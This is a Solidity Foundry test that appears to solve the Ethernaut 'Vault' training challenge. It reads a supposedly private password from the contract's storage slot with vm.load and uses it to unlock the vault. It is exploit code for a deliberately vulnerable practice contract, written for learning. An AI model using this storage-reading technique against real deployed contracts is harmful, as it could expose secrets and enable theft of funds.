// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {Vault} from "../../src/attacks/Vault.sol";

contract VaultTest is Test {
    Vault target;
    bytes32 secret = bytes32("ethernaut");

    function setUp() public {
        target = new Vault(secret);
    }

    function test_exploit() public {
        bytes32 leaked = vm.load(address(target), bytes32(uint256(1)));
        target.unlock(leaked);

        assertEq(target.locked(), false);
    }
}
